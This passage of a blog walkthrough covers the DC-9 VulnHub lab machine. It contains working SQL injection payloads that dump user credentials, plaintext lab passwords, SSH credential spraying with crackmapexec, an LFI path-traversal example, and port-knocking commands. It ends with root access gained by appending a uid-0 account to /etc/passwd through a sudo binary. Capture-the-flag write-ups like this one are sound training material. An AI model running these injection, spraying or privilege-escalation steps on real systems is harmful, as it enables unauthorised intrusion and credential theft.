</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602033848222.png alt=image-20210602033848222></div></p><p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into these tables.</p><p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class=n>Staff</span><span class=s1>&#39; -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602034617576.png alt=image-20210602034617576></div></p><p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p><p>I’ll get the columns name of the table <code>Users</code> with the following query:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class=n>Users</span><span class=s1>&#39; -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602035249528.png alt=image-20210602035249528></div></p><p>I will get the contents of the Username and the Password columns, and it returns a set of credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT group_concat(username, &#39;</span><span class=p>:</span><span class=s1>&#39;, password),2,3,4,5,6 FROM Users -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602040550090.png alt=image-20210602040550090></div></p><p>The password is in md5 format.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> 856f5de590ef37314e7c3bdf6f8a66dc <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>33</span>
</span></span></code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code>, and I’ll just keep that for now.</p><p><div class=img-container><img src=imgs/image-20210602044447046.png alt=image-20210602044447046></div></p><p>On database <code>users</code>, there is only one table called <code>UserDetails</code>. Here is the query.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class=n>users</span><span class=s1>&#39; -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602041638341.png alt=image-20210602041638341></div></p><p>With the following query, I can get the columns on table <code>UserDetails</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class=n>UserDetails</span><span class=s1>&#39; -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602041745247.png alt=image-20210602041745247></div></p><p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602041822329.png alt=image-20210602041822329></div></p><p>That&rsquo;s a lot of credentials. I can sort these creds with <code>sed</code> command by substituting comma with new line.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s1>&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> <span class=p>|</span> sed -s <span class=s1>&#39;s/,/\n/g&#39;</span>
</span></span><span class=line><span class=cl>marym:3kfs86sfd
</span></span><span class=line><span class=cl>julied:468sfdfsd2
</span></span><span class=line><span class=cl>fredf:4sfd87sfd1
</span></span><span class=line><span class=cl>barneyr:RocksOff
</span></span><span class=line><span class=cl>tomc:TC<span class=p>&amp;</span>TheBoyz
</span></span><span class=line><span class=cl>jerrym:B8m#48sd
</span></span><span class=line><span class=cl>wilmaf:Pebbles
</span></span><span class=line><span class=cl>bettyr:BamBam01
</span></span><span class=line><span class=cl>chandlerb:UrAG0D!
</span></span><span class=line><span class=cl>joeyt:Passw0rd
</span></span><span class=line><span class=cl>rachelg:yN72#dsd
</span></span><span class=line><span class=cl>rossg:ILoveRachel
</span></span><span class=line><span class=cl>monicag:3248dsds7s
</span></span><span class=line><span class=cl>phoebeb:smellycats
</span></span><span class=line><span class=cl>scoots:YR3BVxxxw87
</span></span><span class=line><span class=cl>janitor:Ilovepeepee
</span></span><span class=line><span class=cl>janitor2:Hawaii-Five-0
</span></span></code></pre></div><h3 id=shell-access>Shell access<a class=anchor aria-hidden=true href=#shell-access>#</a></h3><h4 id=ssh-login-brute-force>SSH Login brute-force<a class=anchor aria-hidden=true href=#ssh-login-brute-force>#</a></h4><p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>+<span class=o>]</span> chandlerb:UrAG0D! 
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>+<span class=o>]</span> joeyt:Passw0rd 
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>+<span class=o>]</span> janitor:Ilovepeepee 
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id=intended-lfi-and-port-knocking>(Intended) LFI and Port Knocking<a class=anchor aria-hidden=true href=#intended-lfi-and-port-knocking>#</a></h4><p>In my case, I discovered that the website is vulnerable to LFI after inspecting the source code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>chandlerb@dc-9:/var/www/html$ cat manage.php
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;contact-info.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$show_errors</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=o>[</span><span class=s1>&#39;display_errors&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=nv>$show_errors</span> <span class=o>==</span> <span class=s1>&#39;yes&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>file_exists<span class=o>(</span><span class=nv>$file</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            include<span class=o>(</span><span class=nv>$file</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;File does not exist&#34;</span> . <span class=s2>&#34;&lt;br /&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1># LFI vulnerability starts from here</span>
</span></span><span class=line><span class=cl>            <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;file&#39;</span><span class=o>]</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>            <span class=c1># No input sanitization poc: manage?file=../../../../etc/passwd</span>
</span></span><span class=line><span class=cl>            include<span class=o>(</span><span class=s1>&#39;directory/&#39;</span> . <span class=nv>$file</span><span class=o>)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Using LFI is the intended way to gain a foothold before performing brute force. In order to exploit it, I previously had to login using the credentials I obtained through SQLi (<code>admin:transorbital1</code>).</p><p>With LFI can include <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p><p><div class=img-container><img src=imgs/image-20210602050027114.png alt=image-20210602050027114></div></p><p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=k>for</span> i in <span class=m>7469</span> <span class=m>8475</span> 9842<span class=p>;</span> <span class=k>do</span> nc -w1 192.168.2.102 <span class=nv>$i</span><span class=p>;</span> <span class=k>done</span><span class=p>;</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602051747909.png alt=image-20210602051747909></div></p><p>To close the port, I&rsquo;ll need to knock in reverse order:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=k>for</span> i in <span class=m>9842</span> <span class=m>8475</span> 7469<span class=p>;</span> <span class=k>do</span> nc -w1 192.168.2.102 <span class=nv>$i</span><span class=p>;</span> <span class=k>done</span><span class=p>;</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602052201358.png alt=image-20210602052201358></div></p><p>Then, from here, I should use SSH brute force (which I did earlier).</p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-fredf>Shell as fredf<a class=anchor aria-hidden=true href=#shell-as-fredf>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
</span></span><span class=line><span class=cl>BamBam01
</span></span><span class=line><span class=cl>Passw0rd
</span></span><span class=line><span class=cl>smellycats
</span></span><span class=line><span class=cl>P0Lic#10-4
</span></span><span class=line><span class=cl>B4-Tru3-001
</span></span><span class=line><span class=cl>4uGU5T-NiGHts
</span></span></code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p><h4 id=ssh---fredf>SSH - fredf<a class=anchor aria-hidden=true href=#ssh---fredf>#</a></h4><p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>SSH         192.168.2.102   <span class=m>22</span>     192.168.2.102    <span class=o>[</span>+<span class=o>]</span> fredf:B4-Tru3-001 
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ ssh fredf@192.168.2.102
</span></span><span class=line><span class=cl>fredf@192.168.2.102<span class=err>&#39;</span>s password:
</span></span><span class=line><span class=cl>Linux dc-9 4.19.0-6-amd64 <span class=c1>#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>Last login: Thu Apr  <span class=m>8</span> 20:10:42 <span class=m>2021</span> from 192.168.2.103
</span></span><span class=line><span class=cl>fredf@dc-9:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1003<span class=o>(</span>fredf<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1003<span class=o>(</span>fredf<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1003<span class=o>(</span>fredf<span class=o>)</span>
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>User fredf has sudo privileges on a custom binary called <code>test</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>fredf@dc-9:/home$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> fredf on dc-9:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User fredf may run the following commands on dc-9:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /opt/devstuff/dist/test/test
</span></span></code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>fredf@dc-9:/opt/devstuff$ cat test.py 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import sys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> len <span class=o>(</span>sys.argv<span class=o>)</span> !<span class=o>=</span> <span class=m>3</span> :
</span></span><span class=line><span class=cl>    print <span class=o>(</span><span class=s2>&#34;Usage: python test.py read append&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    sys.exit <span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>else</span> :
</span></span><span class=line><span class=cl>    <span class=nv>f</span> <span class=o>=</span> open<span class=o>(</span>sys.argv<span class=o>[</span>1<span class=o>]</span>, <span class=s2>&#34;r&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>output</span> <span class=o>=</span> <span class=o>(</span>f.read<span class=o>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>f</span> <span class=o>=</span> open<span class=o>(</span>sys.argv<span class=o>[</span>2<span class=o>]</span>, <span class=s2>&#34;a&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    f.write<span class=o>(</span>output<span class=o>)</span>
</span></span><span class=line><span class=cl>    f.close<span class=o>()</span>
</span></span></code></pre></div><h4 id=script-analysis>Script Analysis<a class=anchor aria-hidden=true href=#script-analysis>#</a></h4><p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span> <span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>3</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=p>(</span><span class=s2>&#34;Usage: python test.py read append&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>else</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span></code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code> (the file contents of argv1) to that file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>Since this gives arbitrary write on the system, it can be exploited in many ways, one of which is to add a new root account to <code>/etc/passwd</code>.</p><h4 id=exploitation>Exploitation<a class=anchor aria-hidden=true href=#exploitation>#</a></h4><p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
</span></span><span class=line><span class=cl><span class=nv>$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>
</span></span></code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># From this</span>
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl><span class=c1># To</span>
</span></span><span class=line><span class=cl>iamf:<span class=nv>$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p><p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
</span></span></code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>fredf@dc-9:/tmp$ cat /etc/passwd
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
</span></span><span class=line><span class=cl>janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
</span></span><span class=line><span class=cl>iamf:<span class=nv>$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><h4 id=su---root>SU - root<a class=anchor aria-hidden=true href=#su---root>#</a></h4><p>Now I can switch to my account and get a root shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>fredf@dc-9:/tmp$ su iamf
</span></span><span class=line><span class=cl>Password: pass123
</span></span><span class=line><span class=cl>root@dc-9:/tmp#
</span></span></code></pre></div><p>And here is the flag,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@dc-9:~# cat theflag.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
</span></span><span class=line><span class=cl>████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
</span></span><span class=line><span class=cl>██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
</span></span><span class=line><span class=cl>██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
</span></span><span class=line><span class=cl>██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
</span></span><span class=line><span class=cl>╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
</span></span><span class=line><span class=cl>                                                                             
</span></span><span class=line><span class=cl>Congratulations - you have <span class=k>done</span> well to get to this point.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
</span></span><span class=line><span class=cl>who have taken the <span class=nb>time</span> to <span class=nb>complete</span> the various DC challenges.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I also want to send out a big thank you to the various members of @m0tl3ycr3w .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>They are an inspirational bunch of fellows.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Sure, they might smell a bit, but...just kidding.  :-<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Sadly, all things must come to an end, and this will be the last ever
</span></span><span class=line><span class=cl>challenge in the DC series.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>So long, and thanks <span class=k>for</span> all the fish.
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://www.vulnhub.com/entry/dc-6,315/ target=_blank rel="noopener noreferrer">https://www.vulnhub.com/entry/dc-6,315/</a></li><li><a href=https://crackstation.net/ target=_blank rel="noopener noreferrer">https://crackstation.net/</a></li><li><a href=https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/ target=_blank rel="noopener noreferrer">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/port-knocking/>Port-knocking</a></li><li><a href=https://fahmifj.github.io/tags/sql-injection/>SQL-injection</a></li><li><a href=https://fahmifj.github.io/tags/lfi/>LFI</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/arbitrary-file-write/>Arbitrary-file-write</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/openssl/>Openssl</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on twitter" href="https://twitter.com/intent/tweet/?text=VulnHub%20-%20DC-9&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f&hashtags=Linux%2cPort-knocking%2cSQL-injection%2cLFI%2csudo%2cArbitrary-file-write%2cCode-review%2cOpenssl"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f&title=VulnHub%20-%20DC-9&summary=VulnHub%20-%20DC-9&source=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f&title=VulnHub%20-%20DC-9"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 